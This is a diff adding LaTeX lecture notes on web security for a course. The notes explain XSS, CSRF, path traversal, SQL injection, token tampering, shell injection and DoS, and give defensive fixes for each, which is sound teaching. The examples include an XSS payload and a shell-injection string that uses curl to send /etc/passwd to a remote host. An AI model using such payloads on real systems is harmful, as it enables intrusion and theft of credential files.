@@ -1,0 +1,203 @@
+\documentclass[../CMPUT-404-Notes.tex]{subfiles}
+\begin{document}
+\chapter{Security}
+Security on the web has multiple facets
+\begin{itemize}
+    \item Client side
+    \item Server side
+\end{itemize}
+High value targets
+\begin{itemize}
+    \item Private information
+    \item Financial information
+\end{itemize}
+
+\section{What is your website suppose to do?}
+Is your website suppose to:
+\begin{itemize}
+    \item Be a distributor of malware?
+    \item Vouch for the identity of frausters?
+    \item Run arbitrary code?
+    \item Distribute pirated software/media?
+    \item Host pornography
+    \item Do anything you didn't want it to?
+\end{itemize}
+
+\section{Web Content Takeover (XSS)}
+Imagine you ask a user for a username.
+They provide this:
+\begin{minted}[breaklines]{html}
+<iframe width=”100%” height=”100% src=”http://cnn.com/”></iframe>
+\end{minted}
+I assume this wasn't your intent, you just wanted to show a username.
+This happened because you didn't properly encoded the output such that it escapes as HTML.
+
+\subsection{Common XSS}
+Often values are printed as URIs or attributes:
+\begin{itemize}
+    \item e.g., \mintinline{html}{<a href=”http://example.com/user/%s”>}
+    \item The simplest XSS exploit is to pass a “ and wreck that tag like \mintinline{html}{name=”><script>alert(“xss”);</script><}
+    \item For provide the color for your username like \mintinline{html}{color=FFFFFF}
+\end{itemize}
+
+\subsection{Solution}
+\begin{itemize}
+    \item Never print out anything from the user (easier said than done)
+    \item Validate all values you embed in HTML
+    \item Appropriately encode all values
+    \begin{itemize}
+        \item URI Encode URIs, don't just concatenate
+        \item HTML Escape HTML entities
+    \end{itemize}
+    \item Use a templater that will automatically escape everything for
+    you
+    \item Don't use innerHTML in Javascript. Use .html and .text in
+    Jquery or new Text( text ) in Javascript.
+\end{itemize}
+XSS is a big deal because if the website trusts the user and the attacker can inject content, they can inject javascript or other tags and execute commands on the website.
+
+\section{Cross-Site Request Forgery (CSRF)}
+\begin{itemize}
+    \item Trick a user or user agent in executing
+    unintended requests.
+    \item Hijack weak authentication measures - Cookies and sessions
+    \item Repeat actions unnecessarily
+\end{itemize}
+
+\subsection{Solution}
+\begin{itemize}
+    \item Enforce referrer headers (still not perfect)
+    \item Request tokens - don't allow repeated requests
+    \item Make GET/HEAD/OPTIONS safe - /logout should not be a GET
+    \item Avoid any chance of XSS
+    \item Don't rely on cookies, rely on full HTTP auth
+    \item Don't allow users to provide URLs that get embedded!
+    \item Rely on matching cookies
+    \item Origin header - Make sure it comes from a trusted source
+    \item Challenge Response - Make the client provide extra information like re-login, password, captcha, two factor, etc
+\end{itemize}
+
+
+\section{Improper Limitation of a Pathname to a Restricted Directory}
+Access files and URIs that weren't supposed to be exposed!
+\subsection{Solution}
+Often the solution many people do is inadequate. You should try get absolute path and check if the path is within the safe parent Directory then allow the request otherwise deny.
+Or if you detect path traversal, maybe you should just deny them access?
+
+\section{Inclusion of Functionality from Untrusted Control Sphere}
+\begin{itemize}
+    \item Lots of services want you to include iframes
+    and embeddings from them.
+    \begin{itemize}
+        \item They make you trust them not to ruin your site.
+        \item Lots of advertisement networks expect the same
+    \end{itemize}
+    from you.
+    \item When included untrusted content there can
+    be consequences, whether by iframe or
+    actual values.
+\end{itemize}
+
+\section{SQL Injection}
+When a user make a valid SQL operation from an input field and makes unauthorized SQL operations.
+
+
+\subsection{SQL Injection Patterns}
+\begin{itemize}
+    \item Breaking quotes
+    \item Returning all values with 1 or 1=1
+    \item Making multiple statements
+    \item Selecting ALL passwords from the database
+    \item Vandalism: dropping tables
+\end{itemize}
+
+\subsection{Solution}
+SQL Quote all values,
+\begin{itemize}
+    \item Use the SQL execute statement
+    \item NEVER craft a SQL query purely from input strings
+    \item ESCAPE ESCAPE ESCAPE
+\end{itemize}
+
+\section{Poorly Encrypted Cookies/Tokens}
+\begin{itemize}
+    \item The web is stateless! Why not rely on the user
+    to hold the state?
+    \item So let's set application state in the user's
+    cookie so we don't need to use a database to
+    store their session
+\end{itemize}
+
+There are many dangers involving tokens:
+\begin{itemize}
+  \item What happens if they are stolen? 
+  \item what happens if they are reused?
+  \item What happens if they are repeated?
+\end{itemize}
+All of these situations can lead a hacker to trick a web server that it's someone else even without logging in using the user's credentials.
+Furthermore, hackers can change tokens even if they can't read them.
+This is because naive implementations do not check the integrity of an encrypted message. 
+A change of the chiphertext could lead to an improper decryption causing garbage information to be processed by the web server opening up to another attack vector, i.e., SQL injection, Shell injection, etc.
+Which can cause unauthorized access.
+
+\begin{Note}
+  Encryption done well is hard to break, the mathematics behind the encryption is sound. The implementation of the encryption is the general root cause of most encryption hacks. 
+\end{Note}
+
+Tokens are not that safe
+\begin{itemize}
+  \item Make sure you can test their integrity 
+  \item Make sure it is hard to reuse a token - Hash in the user's IP so they have to be at least fro the same host.
+\end{itemize}
+
+
+\section{Shell Injection}
+The same as the other injections but instead of SQL you run a command.
+A malicious user can insert escape code to run what they want.
+
+Imagine you have a code segment like this?
+\begin{listing}[!h]
+\begin{minted}[linenos,numbersep=5pt,frame=lines,framesep=2mm, breaklines]{python}
+os.system("command arg1 arg2 %s", arg3)
+\end{minted}
+\end{listing}
+and a user supply this
+\begin{listing}[!h]
+\begin{minted}[linenos,numbersep=5pt,frame=lines,framesep=2mm, breaklines]{bash}
+; curl -X PUT http://mysite -d @/etc/passwd
+\end{minted}
+\end{listing}
+
+\subsection{Solution}
+\begin{itemize}
+  \item Use libraries that escape all shell commands
+  \item Don't execute commands with a shell, just do direct exec
+  \item For example use python's subprocess to spawn and fork the command.
+\end{itemize}
+
+
+\section{DOS and DDOS}
+(D)DOS or (Distributed) Denial of Service.
+Common DOS methods include:
+\begin{itemize}
+  \item Spamming
+  \item Flooding
+  \item Filling queues with information
+  \item Sending useless expensive jobs
+  \item Using all available resources
+\end{itemize}
+The distributed DOS is DOS but operated with multiple machines.
+Common DDOS methods includes:
+\begin{itemize}
+  \item Redirecting web traffic
+  \item Using DNS poisoning to redirect people
+  \item Lying to routers to route traffic to a non router
+  \item Sending very slowly
+  \item Reading very slowly
+\end{itemize}
+
+
+
+
+
+\end{document}
